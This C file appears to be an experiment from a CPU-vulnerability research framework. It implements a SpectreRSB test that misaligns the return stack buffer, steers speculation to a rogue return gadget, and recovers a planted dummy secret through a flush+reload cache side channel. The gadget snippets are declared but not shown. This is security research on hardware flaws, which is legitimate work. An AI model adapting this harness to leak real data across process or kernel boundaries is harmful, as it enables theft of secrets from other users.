/**
 * Spectre RSB
 *
 * Experiment that does simply do spectreRSB by misaligning the RSB.
 */

#include "flush_reload.h"
#include "jita.h"
#include "kmod/pi.h"
#include "lib.h"
#include "log.h"
#include "spec_lib.h"
#include "test.h"

#ifdef UARF_LOG_TAG
#undef UARF_LOG_TAG
#define UARF_LOG_TAG UARF_LOG_TAG_TEST
#endif

uarf_psnip_declare(history, psnip_history);
uarf_psnip_declare(src_ret_rsp, psnip_src_ret_rsp);
uarf_psnip_declare(dst_gadget, psnip_dst_gadget);
uarf_psnip_declare(rogue_ret, psnip_rogue_ret);

struct TestCaseData {
    uint32_t seed;
    uint32_t num_cands;
    uint32_t num_rounds;
    UarfJitaCtxt *jita_main;
    UarfJitaCtxt *jita_rogue_ret;
};

UARF_TEST_CASE_ARG(basic, arg) {
    struct TestCaseData *data = (struct TestCaseData *) arg;
    srand(data->seed);

    // struct FrConfig fr = fr_init(8, 6, (size_t[]){0, 1, 2, 3, 5, 10});
    UarfFrConfig fr = uarf_fr_init(8, 1, NULL);

    UarfStub stub_main = uarf_stub_init();
    UarfStub stub_rogue_ret = uarf_stub_init();

    uarf_ibpb();

    uarf_fr_reset(&fr);

    for (size_t c = 0; c < data->num_cands; c++) {
        uarf_jita_allocate(data->jita_main, &stub_main, uarf_rand47());
        uarf_jita_allocate(data->jita_rogue_ret, &stub_rogue_ret, uarf_rand47());

        UarfHistory h1 = uarf_get_randomized_history();

        UarfSpecData train_data = {
            .spec_prim_p = stub_main.addr,
            .spec_dst_p_p = _ul(&stub_rogue_ret.addr),
            .fr_buf_p = fr.buf.addr,
            .secret = 3,
            .hist = h1,
        };

        for (size_t r = 0; r < data->num_rounds; r++) {

            uarf_fr_flush(&fr);
            // uarf_clflush_spec_dst(&signal_data);
            // uarf_invlpg_spec_dst(&signal_data);
            uarf_prefetcht0(&train_data);

            // TODO: disable interrupts and preemption
            asm("run:\n\t");
            uarf_run_spec(&train_data);
            uarf_fr_reload_binned(&fr, r);
        }
        uarf_jita_deallocate(data->jita_main, &stub_main);
        uarf_jita_deallocate(data->jita_rogue_ret, &stub_rogue_ret);
    }

    UARF_LOG_INFO("Fr Buffer\n");
    uarf_fr_print(&fr);

    uarf_fr_deinit(&fr);

    UARF_TEST_PASS();
}

static struct TestCaseData data1;
static struct TestCaseData data2;
static struct TestCaseData data3;
static struct TestCaseData data4;

UARF_TEST_SUITE() {
    uint32_t seed = uarf_get_seed();
    UARF_LOG_INFO("Using seed: %u\n", seed);
    uarf_pi_init();

    UarfJitaCtxt jita_main = uarf_jita_init();
    UarfJitaCtxt jita_rogue_ret = uarf_jita_init();

    // uarf_jita_push_psnip(&jita_main, &psnip_history);
    // uarf_jita_push_psnip(&jita_main, &psnip_history);
    // uarf_jita_push_psnip(&jita_main, &psnip_history);
    // uarf_jita_push_psnip(&jita_main, &psnip_history);
    // uarf_jita_push_psnip(&jita_main, &psnip_history);

    uarf_jita_push_psnip(&jita_main, &psnip_src_ret_rsp);
    uarf_jita_push_psnip(&jita_main, &psnip_dst_gadget); // Calls return

    uarf_jita_push_psnip(&jita_rogue_ret, &psnip_rogue_ret);

    data1 = (struct TestCaseData) {
        .num_rounds = 10,
        .num_cands = 10,
        .jita_main = &jita_main,
        .jita_rogue_ret = &jita_rogue_ret,
    };

    UARF_TEST_RUN_CASE_ARG(basic, &data1);

    uarf_pi_deinit();

    return 0;
}
